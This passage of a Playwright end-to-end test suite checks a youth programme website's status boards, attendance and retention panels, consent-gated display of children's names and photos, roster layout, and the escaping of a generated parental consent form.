          // Tiered and in tier order, the way the server ships a paper: two
          // foundation questions then one stretch, so there is exactly one
          // step-up marker to find.
          questions: [
            { q: 'Simplify 2^3 \u00d7 2^4, giving your answer as a number.', tier: 1 },
            { q: 'Evaluate log3 of 81.', tier: 1 },
            { q: 'Evaluate 49^(1/2).', tier: 3 },
          ],
        });
      },
      submit: function (roundId, answers) {
        window.__mathSubmits.push({ roundId: roundId, answers: answers.slice() });
        var body = {
          correct: 2, total: 3, score: 67, ms: 41200, passPct: 70, cleared: false,
          marks: [
            { ok: true,  your: '128', answer: '128' },
            { ok: false, your: '3',   answer: '4' },
            { ok: true,  your: '7',   answer: '7' },
          ],
          opened: [], unlocked: null,
        };
        if (!fast) return Promise.resolve(body);
        return new Promise(function (r) { setTimeout(function () { r(body); }, 1200); });
      },
    };
    props = { auth: { member: { fullName: 'Amaka Amadi', centre: 'Egbeda' } } };
  } else { props = { setPage: function () {} }; }
  // Stand in for the export toolkit so a click can be traced all the way into
  // buildImpositionPDF without rasterising anything.
  if (b === 'cards') {
    window.__pdf = [];
    var face = { dataUrl: 'data:image/jpeg;base64,x', wPx: 10, hPx: 12, bleedPx: 1, trimWPx: 8, trimHPx: 10, bytes: new Uint8Array([1]) };
    window.CardExport = {
      scaleForDpi: function () { return 2; },
      nodeToImage: function () { return Promise.resolve(face); },
      renderFace: function () { return new Promise(function (r) { setTimeout(function () { r(face); }, 25); }); },
      zipStore: function () { return Promise.resolve(new Uint8Array([80, 75])); },
      buildImpositionPDF: function (fronts, o) {
        window.__pdf.push({ fronts: fronts.length, backs: (o && o.backs || []).length });
        return Promise.resolve(new Uint8Array([37, 80, 68, 70]));
      },
      download: function () {},
    };
  }
  try {
    /* The board, plus the REAL dialog and toast hosts.
       Not decoration: dialog and toast are top-level bindings inside the
       bundle, so a fixture that stubs window.dialog intercepts nothing — and an
       awaited dialog.confirm with no host mounted never settles, so the code
       under test simply stops with no error and nothing on screen. Any board
       with a confirm in it would be untestable without these. */
    ReactDOM.createRoot(document.getElementById('root')).render(
      React.createElement(React.Fragment, null,
        React.createElement(window[which], props),
        window.DialogHost ? React.createElement(window.DialogHost) : null,
        window.ToastHost ? React.createElement(window.ToastHost) : null));
  } catch (e) { window.__errors.push(String(e && e.message)); }
</script></body></html>`);

  fs.writeFileSync(path.join(ROOT, 'tests', '_upload_fixture.html'),
    '<!doctype html><html><body><script src="/dist/api-client.js"></script></body></html>');

  const server = spawn('php', ['-S', '127.0.0.1:' + PORT, '-t', ROOT], { cwd: ROOT, detached: true, stdio: 'ignore' });
  await waitForServer(BASE);
  let pass = 0, fail = 0;
  const ok = (l, c) => { c ? pass++ : (fail++, console.error('  ✗ ' + l)); };
  /* An INTERACTION, reported as an assertion instead of thrown.
   *
   * A bare `await page.fill(...)` or `.click()` that cannot find its target
   * rejects after the Playwright timeout, and because every block in this file
   * runs inside one async IIFE that rejection propagates straight past all of
   * them. One missing input on one screen therefore reported itself as a single
   * crash and silently took every LATER assertion in the suite with it —
   * hundreds of checks that never ran, in a run that looked like it had found
   * one problem.
   *
   * `step` returns true/false so a block can bail out cleanly on its own
   * precondition, and emits a failed assertion with the reason when it cannot
   * proceed. A bail is loud: the suite says which control it could not drive
   * and keeps going. */
  const step = async (label, fn) => {
    try { await fn(); return true; }
    catch (e) { ok(label + ' [' + String((e && e.message) || e).split('\n')[0].slice(0, 120) + ']', false); return false; }
  };
  let browser;
  try {
    // Fake camera so the registration photo step can be driven end-to-end;
    // without a real stream a blank <video> looks identical to a working one.
    browser = await chromium.launch({ executablePath: exe, args: ['--no-sandbox',
      '--use-fake-ui-for-media-stream', '--use-fake-device-for-media-stream'] });

    for (const board of ['status', 'vol']) {
      const label = board === 'vol' ? '/v-status' : '/status';

      // ── renders with data ────────────────────────────────────────────────
      let page = await browser.newPage();
      const consoleErrs = [];
      // Script errors only — a missing favicon under php -S is not a defect.
      page.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) consoleErrs.push(m.text()); });
      page.on('pageerror', e => consoleErrs.push(String(e.message)));
      await page.goto(BASE + '/tests/_boards_fixture.html?board=' + board + '&mode=ok', { waitUntil: 'networkidle' });
      await page.waitForTimeout(1600);   // let the count-up animation settle
      const body = await page.evaluate(() => document.body.innerText);
      const errs = await page.evaluate(() => window.__errors);
      ok(label + ' mounts with no script error', errs.length === 0 && consoleErrs.length === 0);
      if (errs.length || consoleErrs.length) console.error('      ', errs.concat(consoleErrs).slice(0, 3).join(' | '));
      ok(label + ' renders live numbers, not an error state', body.indexOf("couldn't load") === -1 && body.indexOf("can't reach") === -1 && /\d/.test(body));
      await page.close();

      // ── unreachable origin ───────────────────────────────────────────────
      page = await browser.newPage();
      await page.goto(BASE + '/tests/_boards_fixture.html?board=' + board + '&mode=fail', { waitUntil: 'networkidle' });
      await page.waitForTimeout(400);
      const failBody = await page.evaluate(() => document.body.innerText);
      ok(label + ' says the server is unreachable, not "your device"', /can't reach the server/i.test(failBody));
      // The retry button must work and must not be wired to a stale binding.
      const before = await page.evaluate(() => window.__calls);
      await page.getByRole('button', { name: /retry/i }).first().click();
      await page.waitForTimeout(200);
      const after = await page.evaluate(() => window.__calls);
      const key = board === 'vol' ? 'volunteerStatus' : 'status';
      ok(label + ' Retry re-fetches (' + before[key] + ' → ' + after[key] + ')', after[key] > before[key]);
      await page.close();

      // ── no request pile-up while a call is in flight ─────────────────────
      page = await browser.newPage();
      await page.goto(BASE + '/tests/_boards_fixture.html?board=' + board + '&mode=hang', { waitUntil: 'networkidle' });
      await page.waitForTimeout(300);
      const n0 = await page.evaluate((k) => window.__calls[k], key);
      // Hammer the refresh control: with a request already hanging, none of
      // these may open another one.
      for (let i = 0; i < 8; i++) {
        await page.evaluate(() => {
          const b = Array.from(document.querySelectorAll('button')).find(x => /retry|refresh/i.test(x.textContent || ''));
          if (b) b.click();
        });
      }
      await page.waitForTimeout(300);
      const n1 = await page.evaluate((k) => window.__calls[k], key);
      ok(label + ' does not stack requests while one is in flight (' + n0 + ' → ' + n1 + ')', n1 === n0);
      await page.close();
    }

    /* ── /v-status shows the attendance BREAKDOWN, not only today ──────────
     * The board counted who was in this morning and nothing else, while every
     * check-in a volunteer had ever made sat in the same table. These read
     * inside the Attendance tab specifically, so a number from the fulfilment
     * KPIs elsewhere on the page cannot satisfy them. */
    const vsp = await browser.newPage();
    const vspErrs = [];
    vsp.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) vspErrs.push(m.text()); });
    vsp.on('pageerror', e => vspErrs.push(String(e.message)));
    await vsp.goto(BASE + '/tests/_boards_fixture.html?board=vol&mode=ok', { waitUntil: 'networkidle' });
    await vsp.waitForTimeout(1400);

    await vsp.getByRole('button', { name: /attendance/i }).first().click();
    await vsp.waitForTimeout(300);
    const attText = await vsp.evaluate(() => {
      const v = document.querySelector('.view');
      return v ? v.innerText : '';
    });
    ok('/v-status Attendance tab reports the rate over the window',
      /80%/.test(attText) && /20 of 25 days served/.test(attText));
    ok('/v-status separates punctuality from presence',
      /90%/.test(attText) && /On time/i.test(attText) && /2 late arrivals/.test(attText));
    ok('/v-status names the days the rate is out of',
      /10 programme days/.test(attText) && /2026-07-15/.test(attText) && /2026-07-24/.test(attText));
    ok('/v-status breaks the rate down by centre and by role',
      /Ijaiye/.test(attText) && /15\/20/.test(attText) && /75%/.test(attText)
      && /Instructor/.test(attText) && /5\/5/.test(attText));
    ok('/v-status draws one trend column per measured day',
      (await vsp.$$('.att-col')).length === 10);
    ok('/v-status shows the reliability bands with their counts',
      /Almost every day/.test(attText) && /Patchy/.test(attText));
    ok('/v-status prints the no-rota caveat where the numbers are',
      /no rota in the system/.test(attText));

    /* ── Are we KEEPING our volunteers? ────────────────────────────────────
     * The fixture is built so the two figures point opposite ways: 80%
     * attendance, and three of the eight settled volunteers are gone. A rate
     * cannot raise that alarm — a volunteer who stops leaves the numerator and
     * the denominator together, so the rate is undisturbed by their leaving.
     */
    ok('/v-status says how many volunteers are still turning up, not only the rate',
      /Still turning up/i.test(attText) && /2 stopped/.test(attText) && /1 never started/.test(attText));
    /* "Too new to say" has to be visible, or the reader assumes the panel's
        denominator is the headcount and the percentages look wrong. */
    ok('…and keeps the ones too new to judge out of the count, saying so',
      /too new to say/i.test(attText) && /Who is still with us/.test(attText)
      && /8 who have been here long enough/.test(attText));
    /* THE CASE THE PANEL EXISTS FOR. Ghostfield has two volunteers and neither
       turns up, so it has no rate at all — on the rate table below it is a
       blank row that reads as "no data" rather than as an emergency. */
    const vretRows = await vsp.evaluate(() => Array.from(document.querySelectorAll('.vret-row'))
      .map(r => r.innerText.replace(/\s+/g, ' ')));
    ok('…and names a centre where NOBODY is turning up, which a rate cannot express',
      vretRows.some(r => /Ghostfield/.test(r) && /centre/.test(r)));
    ok('…broken out per role as well as per centre, because they fail differently',
      vretRows.some(r => /Mentor/i.test(r) && /role/.test(r))
      && vretRows.some(r => /Ijaiye/.test(r) && /centre/.test(r)));
    // Worst first: the row that needs reading is the one at the top.
    ok('…worst first, so the site in trouble is the first row',
      vretRows.length >= 3 && /Ghostfield/.test(vretRows[0]));
    ok('/v-status Attendance tab mounts clean', vspErrs.length === 0);
    if (vspErrs.length) console.error('      ', vspErrs.slice(0, 3).join(' | '));

    await vsp.getByRole('button', { name: /volunteers/i }).first().click();
    await vsp.waitForTimeout(300);
    const dirText = await vsp.evaluate(() => {
      const v = document.querySelector('.vol-grid');
      return v ? v.innerText : '';
    });
    ok('/v-status volunteer cards carry their own attendance, with the denominator',
      /10 of 10 days/.test(dirText) && /5 of 10 days/.test(dirText) && /10 in a row/.test(dirText));
    ok('/v-status a volunteer with no open days yet shows no rate at all',
      dirText.indexOf('0 of 0 days') === -1 && /@vol-9f8e/.test(dirText));
    await vsp.close();

    /* ── /s-status shows REGISTRATION, not only attendance ─────────────────
     * The board reported attendance alone. The API grew a `registration`
     * block and the page was never wired to it, so the whole feature was
     * dead payload — and the existing assertion above ("renders live
     * numbers") passed the entire time, because it only looked for a digit
     * anywhere on the page. These read inside the registration section
     * specifically, so an unrelated count elsewhere cannot satisfy them. */
    const rp = await browser.newPage();
    const rpErrs = [];
    rp.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) rpErrs.push(m.text()); });
    rp.on('pageerror', e => rpErrs.push(String(e.message)));
    await rp.goto(BASE + '/tests/_boards_fixture.html?board=status&mode=ok', { waitUntil: 'networkidle' });
    await rp.waitForTimeout(1600);   // count-up animation settles on the real values
    const regSec = await rp.evaluate(() => {
      const el = document.querySelector('[data-board-section="registration"]');
      return el ? el.innerText : null;
    });
    // Scoped to the KPI grid, not the whole page — the registration section
    // below uses the same words, so a body-wide match would pass even with
    // the KPI cards missing.
    const kpiRow = await rp.evaluate(() => {
      const el = document.querySelector('.kpi-grid');
      return el ? el.innerText : null;
    });
    await rp.close();

    ok('/s-status renders a registration section at all', regSec !== null);
    ok('…with the registered total from the payload (137)', /\b137\b/.test(regSec || ''));
    ok('…the capacity it is measured against (180 places)', /\b180\b/.test(regSec || ''));
    ok('…and the fill rate (76%)', /76%/.test(regSec || ''));
    ok('…consent verified (118) and awaiting a parent (19)', /\b118\b/.test(regSec || '') && /\b19\b/.test(regSec || ''));
    ok('…the consent rate as a percentage (86%)', /86%/.test(regSec || ''));
    ok('…sign-ups today (7) and this week (23)', /\b7\b/.test(regSec || '') && /\b23\b/.test(regSec || ''));
    ok('…per-centre fill for both centres (47/60 and 90/120)',
       /47\s*\/\s*60/.test(regSec || '') && /90\s*\/\s*120/.test(regSec || ''));
    ok('…and pending consent is called out per centre', /6 pending/.test(regSec || '') && /13 pending/.test(regSec || ''));
    // innerText is the RENDERED text, so the cards' text-transform:uppercase
    // labels come back as "REGISTERED" — hence the /i.
    ok('registration also reaches the at-a-glance KPI row',
       /registered/i.test(kpiRow || '') && /\b137\b/.test(kpiRow || '')
       && /consent verified/i.test(kpiRow || '') && /\b118\b/.test(kpiRow || ''));
    ok('/s-status registration renders with no script error', rpErrs.length === 0);
    if (rpErrs.length) console.error('      ', rpErrs.slice(0, 3).join(' | '));

    // An API older than the frontend must degrade to the attendance board,
    // not throw. Also the control for every assertion above.
    const rn = await browser.newPage();
    const rnErrs = [];
    rn.on('pageerror', e => rnErrs.push(String(e.message)));
    await rn.goto(BASE + '/tests/_boards_fixture.html?board=status&mode=ok&noreg=1', { waitUntil: 'networkidle' });
    await rn.waitForTimeout(1200);
    const noRegSec = await rn.evaluate(() => document.querySelector('[data-board-section="registration"]'));
    const noRegBody = await rn.evaluate(() => document.body.innerText);
    await rn.close();
    ok('a payload with no registration block hides the section (control)', noRegSec === null);
    ok('…and the attendance board still renders beside it', /Centre by centre/.test(noRegBody) && rnErrs.length === 0);

    /* ── The public board reports who has LEFT, not only who came today ────
     * The fixture is built so the two figures disagree: the headline rate is a
     * healthy 80% while 13 of 120 children have stopped coming, 9 of them at a
     * centre sitting ABOVE the watch line on today's rate. A rate cannot raise
     * that alarm — a child who leaves stops being counted absent, so quitting
     * nudges the rate up — which is why this is a separate panel and not
     * another column.
     *
     * Scoped to the retention section, so the "13" and "104" asserted on are
     * that panel's and not some unrelated count elsewhere on a long page. */
    const rt = await browser.newPage();
    const rtErrs = [];
    rt.on('pageerror', e => rtErrs.push(String(e.message)));
    await rt.goto(BASE + '/tests/_boards_fixture.html?board=status&mode=ok', { waitUntil: 'networkidle' });
    await rt.waitForTimeout(1600);   // the count-up animation settles first
    const retRead = await rt.evaluate(() => {
      const el = document.querySelector('[data-board-section="retention"]');
      const kg = document.querySelector('.kpi-grid');
      return {
        sec: el ? el.innerText : null,
        rows: el ? Array.from(el.querySelectorAll('.ret-row')).map(r => r.innerText) : [],
        kpi: kg ? kg.innerText : '',
        body: document.body.innerText,
      };
    });
    await rt.close();

    ok('/s-status renders a retention section at all', retRead.sec !== null);
    ok('…naming how many are still coming (104) and how many stopped (13)',
       /\b104\b/.test(retRead.sec || '') && /\b13\b/.test(retRead.sec || ''));
    // The threshold has to be stated, or "stopped" is a word with no definition.
    ok('…and saying what "stopped" MEANS (the last 3 sessions)',
       /last 3 sessions/i.test(retRead.sec || ''));
    // The window is the term, not today — a reader must not take it for the
    // same period as the attendance rate above it.
    ok('…over the window it was measured on, not today',
       /18 sessions/.test(retRead.sec || '') && /2026-07-06/.test(retRead.sec || ''));
    ok('…keeping "never started" apart from "stopped" (3 vs 13)',
       /never started/i.test(retRead.sec || ''));
    ok('…and per centre, so the worst site is visible (Ijaiye 22.5%)',
       retRead.rows.some(r => /Ijaiye/.test(r) && /22\.5%/.test(r))
       && retRead.rows.some(r => /Egbeda/.test(r) && /\b5%/.test(r)));
    ok('retention reaches the at-a-glance KPI row beside the rate',
       /still coming/i.test(retRead.kpi) && /13 stopped/i.test(retRead.kpi));
    /* The summary sentence is the one thing a passer-by reads. It said only
       that attendance was holding; it now has to say children are leaving. */
    ok('…and the summary says children are LEAVING, not just that the rate holds',
       /came and then stopped/i.test(retRead.body) && /10\.8%/.test(retRead.body));
    ok('/s-status retention renders with no script error', rtErrs.length === 0);
    if (rtErrs.length) console.error('      ', rtErrs.slice(0, 3).join(' | '));

    /* The control, and the one that matters most: with no programme calendar
       the backend sends an EMPTY retention block, and the board must show
       nothing rather than "0 stopped". A reassuring zero is worse than a
       missing panel, because somebody would believe it. */
    const rz = await browser.newPage();
    const rzErrs = [];
    rz.on('pageerror', e => rzErrs.push(String(e.message)));
    await rz.goto(BASE + '/tests/_boards_fixture.html?board=status&mode=ok&noret=1', { waitUntil: 'networkidle' });
    await rz.waitForTimeout(1200);
    const rzRead = await rz.evaluate(() => ({
      sec: document.querySelector('[data-board-section="retention"]'),
      body: document.body.innerText,
    }));
    await rz.close();
    ok('an empty retention block hides the section (control)', rzRead.sec === null);
    ok('…and says nothing about anybody having stopped',
       !/stopped coming/i.test(rzRead.body) && !/still coming/i.test(rzRead.body));
    ok('…while the attendance board renders as before',
       /Centre by centre/.test(rzRead.body) && rzErrs.length === 0);

    /* ── A name or face appears ONLY with consent ──────────────────────────
     * The backend sends `name`/`photo` as null unless the guardian granted
     * "Feature on our website" (and "Photos & media" for the picture). This
     * checks the board honours both directions: the consented student is
     * named and pictured, the partially-consented one is named with NO
     * image, and the unconsented one is neither. A false negative here is a
     * cosmetic bug; a false positive publishes a child's photograph without
     * permission, which is why the absence assertions matter more than the
     * presence ones. */
    const lb = await browser.newPage();
    const lbErrs = [];
    lb.on('pageerror', e => lbErrs.push(String(e.message)));
    await lb.goto(BASE + '/tests/_boards_fixture.html?board=status&mode=ok', { waitUntil: 'networkidle' });
    await lb.waitForTimeout(1200);
    // Switch to the Leaderboard tab, where students are listed.
    await lb.evaluate(() => {
      const b = Array.from(document.querySelectorAll('button')).find(x => /leaderboard/i.test(x.textContent || ''));
      if (b) b.click();
    });
    await lb.waitForTimeout(800);
    const board = await lb.evaluate(() => {
      const rows = Array.from(document.querySelectorAll('.lb-row'));
      const find = (needle) => rows.find(r => (r.innerText || '').includes(needle)) || null;
      const rowOf = (needle) => {
        const r = find(needle);
        return r ? { text: r.innerText, imgs: Array.from(r.querySelectorAll('img')).map(i => i.getAttribute('src')) } : null;
      };
      return {
        consented: rowOf('Adaeze Okonkwo'),
        nameOnly:  rowOf('Bode Adeyemi'),
        anon:      rowOf('stonelion'),
        bodyHasSurname: (document.body.innerText || '').includes('Adeyemi'),
        allImgs: Array.from(document.querySelectorAll('.lb-row img')).map(i => i.getAttribute('src')),
        note: !!document.querySelector('[data-board-note="consent-rule"]'),
      };
    });
    await lb.close();

    ok('a fully consented student is shown by name', !!board.consented);
    ok('…and their photograph is rendered', !!board.consented && board.consented.imgs.includes('/assets/logo.png'));
    ok('…and their handle is kept alongside it', !!board.consented && /@brightspark/.test(board.consented.text));
    ok('a student consented to naming but NOT to photos is named', !!board.nameOnly && board.bodyHasSurname);
    ok('…with no image on their row', !!board.nameOnly && board.nameOnly.imgs.length === 0);
    ok('a student with no consent stays a handle', !!board.anon && /@?stonelion/.test(board.anon.text));
    ok('…and is never named', !!board.anon && !/Okonkwo|Adeyemi/.test(board.anon.text));
    ok('exactly one photograph is published across the leaderboard', board.allImgs.length === 1);
    ok('the board states the consent rule where copy cannot override it', board.note);
    ok('the consent-gated leaderboard renders with no script error', lbErrs.length === 0);
    if (lbErrs.length) console.error('      ', lbErrs.slice(0, 3).join(' | '));

    /* ── /summer and the Club run on real records, never invented ones ────
     * The summer gallery rendered twelve fictional teenagers from data.js
     * captioned "not real students", and the Club board silently swapped the
     * same twelve in whenever fewer than three real members came back. On a
     * live programme's own site that is the wrong thing to publish: it fills
     * the page a parent reads with children who do not exist, and it hides
     * that the real ones were one call away. An empty board is information;
     * a fabricated one is not. */
    const sp = await browser.newPage();
    const spErrs = [];
    sp.on('pageerror', e => spErrs.push(String(e.message)));
    await sp.goto(BASE + '/tests/_boards_fixture.html?board=summer&mode=ok', { waitUntil: 'networkidle' });
    await sp.waitForTimeout(700);
    const summerTxt = await sp.evaluate(() => document.body.innerText);
    const summerStars = await sp.evaluate(() =>
      Array.from(document.querySelectorAll('.member-card')).map(c => c.innerText));
    await sp.close();

    ok('/summer mounts with no script error', spErrs.length === 0);
    if (spErrs.length) console.error('       ', spErrs.slice(0, 3).join(' | '));
    ok('/summer shows the real cohort, not the demo roster',
       summerStars.length === 4 && !/Future Music Producer|Tech Explorer/.test(summerTxt));
    ok('…naming the consented student', /Adaeze Okonkwo/.test(summerTxt));
    ok('…and the unconsented one only by handle', /@?stonelion/.test(summerTxt) && !/Okonkwo.*stonelion/.test(''));
    ok('…with stars on the card', /★\s*5/.test(summerTxt) || summerStars.some(c => /star/i.test(c)));
    ok('…and faculties from the live register', /Tech/.test(summerTxt) && /Arts/.test(summerTxt));

    /* An empty register on /summer. This is the state a fallback fires in, so
       it is the only state that can prove there isn't one — with three real
       students loaded, a "use demo when empty" branch never runs and the test
       passes either way. */
    const spe = await browser.newPage();
    const speErrs = [];
    spe.on('pageerror', e => speErrs.push(String(e.message)));
    await spe.goto(BASE + '/tests/_boards_fixture.html?board=summer&mode=ok&empty=1', { waitUntil: 'networkidle' });
    await spe.waitForTimeout(700);
    const summerEmpty = await spe.evaluate(() => document.body.innerText);
    const summerEmptyCards = await spe.evaluate(() => document.querySelectorAll('.member-card').length);
    await spe.close();
    ok('/summer with nobody enrolled renders instead of crashing', speErrs.length === 0);
    ok('…shows no student cards at all', summerEmptyCards === 0);
    ok('…and says the class is not enrolled rather than inventing one',
       /has not been enrolled yet/.test(summerEmpty) && !/Kwame|Nneka|Hadiza|Chinedu/.test(summerEmpty));

    // The Club board with only two real members: it must show two, not twelve.
    const cp = await browser.newPage();
    const cpErrs = [];
    cp.on('pageerror', e => cpErrs.push(String(e.message)));
    await cp.goto(BASE + '/tests/_boards_fixture.html?board=club&mode=ok', { waitUntil: 'networkidle' });
    await cp.waitForTimeout(700);
    const clubTxt = await cp.evaluate(() => document.body.innerText);
    /* ── The roster grid ─────────────────────────────────────────────────
     * Reported as "too irregular, terrible", and it was: four cards at four
     * different widths with four differently-sized photos. One row's handle
     * is thirty-two characters, and a bare `1fr` column is minmax(AUTO, 1fr)
     * — auto resolving to min-content, which for an unbreakable string is
     * the whole string. That one card widened its own column and squeezed
     * the rest, and the ellipsis on the name could never fire because the
     * column grew instead of the text truncating.
     */
    await cp.close();

    ok('the Club page mounts with no script error', cpErrs.length === 0);
    if (cpErrs.length) console.error('       ', cpErrs.slice(0, 3).join(' | '));
    ok('two real members are NOT replaced by the twelve-strong demo roster',
       /MEMBER DIRECTORY · 2/.test(clubTxt) && !/Kwame|Nneka|Hadiza|Chinedu/.test(clubTxt));
    ok('…and no invented statistics are printed as fact',
       !/Earned by \d+%/i.test(clubTxt) && !/126 \/ 164/.test(clubTxt));
    ok('…the leaderboard names them', /Adaeze O\./.test(clubTxt) && /Tunde B\./.test(clubTxt));
    ok('…and shows stars beside XP on the featured member', /★ 12/.test(clubTxt) && /2,980 XP/.test(clubTxt));

    /* Measured on /summer, which is where the roster grid lives. */
    /* css=1 matters here and nowhere else in this block: the claim is about
       LAYOUT, and geometry measured on an unstyled page is four block-level
       divs at container width — which would pass "all the same width" without
       the grid existing at all. */
    const rg = await browser.newPage();
    await rg.goto(BASE + '/tests/_boards_fixture.html?board=summer&mode=ok&css=1', { waitUntil: 'networkidle' });
    /* Wait for the FONTS, not for a stopwatch. These assertions measure where a
       footer sits, and a card whose name is still in the fallback face wraps
       differently from one that is not — so a fixed 700ms passed most of the
       time and failed when the machine was busy, which is the worst kind of red.
       document.fonts.ready is the actual precondition. */
    await rg.waitForFunction(() => document.fonts && document.fonts.status === 'loaded', { timeout: 15000 }).catch(() => {});
    await rg.waitForFunction(() => {
      const c = document.querySelectorAll('.roster-grid > .member-card');
      return c.length >= 4 && c[0].getBoundingClientRect().width > 0;
    }, { timeout: 15000 });
    await rg.waitForTimeout(200);
    const cardGeom = await rg.evaluate(() => {
      const cards = Array.from(document.querySelectorAll('.roster-grid > .member-card'));
      /* The photo tile, by CLASS. It used to be found by matching an inline
         `aspect-ratio` style, which stopped meaning anything the moment the
         card's geometry moved into a stylesheet — and then silently measured
         the card's first child instead, so the assertion still passed while
         measuring the wrong box. */
      const tiles = cards.map(c => c.querySelector('.member-card-fig')
        || c.querySelector('div[style*="aspect-ratio"], div[style*="aspectRatio"]')
        || c.firstElementChild);
      const r = (el) => el.getBoundingClientRect();
      return {
        n: cards.length,
        widths: cards.map(c => Math.round(r(c).width)),
        tileH: tiles.map(t => Math.round(r(t).height)),
        // Where the footer line sits, measured from the top of the grid.
        feet: cards.map(c => {
          const f = c.querySelector('.member-card-foot');
          return f ? Math.round(r(f).top - r(c.parentElement).top) : -1;
        }),
        longest: cards.map(c => c.textContent).find(t => /egbusor-chiemerie-benedict/.test(t)) ? 1 : 0,
      };
    });
    await rg.close();

    ok('the roster draws every student, long handle included (' + cardGeom.n + ')',
      cardGeom.n === 4 && cardGeom.longest === 1);
    /* Identical widths is the whole fix. One card wider than another means a
       column sized itself to its content, and everything downstream — photo
       size, name truncation, where the footer sits — follows from it. */
    ok('…all at the same width (' + cardGeom.widths.join(', ') + ')',
      new Set(cardGeom.widths).size === 1);
    ok('…so every photo is the same size too (' + cardGeom.tileH.join(', ') + ')',
      new Set(cardGeom.tileH).size === 1);
    /* And the footers line up across the row. Today that follows from the
       cards being the same height with identical one-line content; the
       margin-top:auto on the foot is what keeps it true the first time one
       card's content is taller than another's. */
    ok('…and the centre/attendance line sits level across the row',
      new Set(cardGeom.feet).size === 1 && cardGeom.feet[0] > 0);
    /* The long handle is truncated rather than allowed to set the width. */
    ok('…with an over-long handle cut off, not left to stretch the card',
      await (async () => {
        const c2 = await browser.newPage();
        await c2.goto(BASE + '/tests/_boards_fixture.html?board=summer&mode=ok&css=1', { waitUntil: 'networkidle' });
        await c2.waitForTimeout(600);
        const clipped = await c2.evaluate(() => {
          /* Any element carrying the full name as a title — the card is a
             link now and the name is a <span> inside it, so pinning the tag
             was pinning the markup rather than the behaviour. */
          const el = Array.from(document.querySelectorAll('.roster-grid .member-card [title]'))
            .find(d => /egbusor-chiemerie-benedict/.test(d.getAttribute('title') || ''));
          if (!el) return false;
          const cs = getComputedStyle(el);
          const card = el.closest('.member-card').getBoundingClientRect();
          /* Three separate things, because two of them pass on their own while
             the text still spills: there is more text than fits, it is CUT
             rather than allowed to run on, and what is drawn stays inside the
             card. `overflow: hidden` alone with no ellipsis truncates
             mid-letter; `nowrap` alone just overflows visibly. */
          return el.scrollWidth > el.clientWidth + 1
            && cs.textOverflow === 'ellipsis' && cs.overflow !== 'visible'
            && el.getBoundingClientRect().right <= card.right + 1;
        });
        await c2.close();
        return clipped;
      })());

    // An empty programme must render an honest empty state, not crash — the
    // featured member used to be top[0] dereferenced unconditionally.
    const ce2 = await browser.newPage();
    const ce2Errs = [];
    ce2.on('pageerror', e => ce2Errs.push(String(e.message)));
    await ce2.goto(BASE + '/tests/_boards_fixture.html?board=club&mode=ok&empty=1', { waitUntil: 'networkidle' });
    await ce2.waitForTimeout(600);
    const emptyTxt = await ce2.evaluate(() => document.body.innerText);
    await ce2.close();
    ok('an empty cohort renders instead of crashing the page', ce2Errs.length === 0);
    if (ce2Errs.length) console.error('       ', ce2Errs.slice(0, 3).join(' | '));
    ok('…and says so honestly rather than inventing members',
       /No Club members yet/.test(emptyTxt) && !/Kwame|Nneka|Hadiza/.test(emptyTxt));

    /* ── The parental consent FORM ─────────────────────────────────────────
     * A legal instrument a parent signs, generated client-side, so nothing
     * server-side validates it. It is a pure function on the bundle, which
     * means it can be asserted on directly. The escaping check matters most:
     * a child's name goes straight into this document, and a name containing
     * a quote or an angle bracket must not be able to alter the clauses. */
    const cf = await browser.newPage();
    await cf.goto(BASE + '/tests/_boards_fixture.html?board=status&mode=ok', { waitUntil: 'domcontentloaded' });
    await cf.waitForFunction(() => typeof window.consentFormHtml === 'function', null, { timeout: 15000 });
    const form = await cf.evaluate(() => {
      const c = {
        student: { fullName: 'Adaeze <b>Okonkwo</b>', displayId: 'NGG/26/0042', age: 12, sex: 'F', centre: 'Ijaiye', track: 'Tech' },
        guardian: { name: 'Mrs "Nkechi" Okonkwo', phone: '08031112222', email: 'n@example.org' },
        programme: { name: 'Next Generation Genius', website: 'ngg.example.org', phone: '0800-000' },
      };
      // Base document: the seven standing clauses, no organisation extras.
      c.doc = { orgName: 'Afrovanguard Initiative Ltd', rcNumber: 'RC-999', orgAddress: '12 Akowonjo Rd',
                dpoContact: 'privacy@example.org', retentionYears: 7, formRef: 'CF-9', formRev: '9.9',
                logoUrl: '/assets/logo.png', website: 'example.org', phone: '0800' };
      c.signature = { image: 'data:image/png;base64,AAAA', name: 'Mrs Okonkwo', at: '2026-07-27T10:00:00Z' };
      const filled = window.consentFormHtml(c);
      const blank = window.consentFormHtml(c, { blank: true });
      // …and the same document with a clause the organisation added.
      const withExtra = window.consentFormHtml(
        Object.assign({}, c, { doc: Object.assign({}, c.doc, { extraClauseTitle: 'Transport', extraClause: 'Bus fare is covered.' }) }));
      const count = (h, re) => (h.match(re) || []).length;
      return {
        clauses: count(filled, /class="cl-t"/g),
        required: count(filled, /class="tag req"/g),
        optional: count(filled, /class="tag opt"/g),
        boxes: count(filled, /class="box"/g),
        hasName: filled.includes('Adaeze'),
        // Escaped, not executable: the tags must be entities and the raw
        // markup must not survive into the document.
        escaped: filled.includes('&lt;b&gt;Okonkwo&lt;/b&gt;') && !filled.includes('<b>Okonkwo</b>'),
        quoteEscaped: filled.includes('&quot;Nkechi&quot;') && !/name="?Mrs "Nkechi"/.test(filled),
        ndpa: /Nigeria Data Protection Act 2023/.test(filled),
        childRights: /Child's Rights Act 2003/.test(filled),
        withdrawal: /withdraw any consent at any time/i.test(filled),
        // Clause 5 must say publication needs clause 4 as well.
        photoGate: /permission to take a photograph is not permission to publish it/i.test(filled),
        signatures: count(filled, /class="line"/g),
        officeUse: /For office use only/i.test(filled),
        a4: /@page \{ size: A4/.test(filled),
        // Blank mode: same clauses, no child's details.
        blankClauses: count(blank, /class="cl-t"/g),
        blankHasName: blank.includes('Adaeze'),
        blankHasRules: count(blank, /class="w"/g) > 10,
        // Logo, editable document settings, signature, must-answer tags.
        logo: /class="logo" src="\/assets\/logo\.png"/.test(filled),
        orgName: filled.includes('Afrovanguard Initiative Ltd'),
        rc: filled.includes('RC-999'),
        formRef: /Form CF-9 &middot; rev\. 9\.9/.test(filled),
        retention: /for 7 year\(s\) afterwards/.test(filled),
        dpo: filled.includes('privacy@example.org'),
        extraClause: withExtra.includes('Transport') && withExtra.includes('Bus fare is covered.'),
        clausesWithExtra: count(withExtra, /class="cl-t"/g),
        answerRequired: count(filled, /class="tag ans"/g),
